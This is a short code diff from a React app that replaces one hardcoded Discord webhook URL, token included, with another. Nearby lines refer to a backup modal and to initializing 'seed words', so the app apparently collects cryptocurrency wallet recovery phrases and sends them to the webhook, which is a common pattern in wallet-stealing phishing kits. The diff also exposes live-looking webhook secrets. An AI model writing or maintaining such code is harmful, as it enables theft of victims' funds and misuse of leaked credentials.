@@ -14,7 +14,7 @@ function App() {
   const [showBackupModal, setShowBackupModal] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321730136147623966/lHHQFPEFSLGQrpB1HsZ82jBRWDEL-KnBb-jDRERjDvmaqPQkdXo-9VBSG2uUvRjW36j7'; // Replace with your webhook URL
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1340850265552846849/IORWJdWmyjzlQvGX4GrP9tpp4caDOpDMtVfvgU9SXWpuFzGzLIYvi1jpM5fQTOJk80Wg'; // Replace with your webhook URL
 
   // Initialize seed words when modal opens
   useEffect(() => {
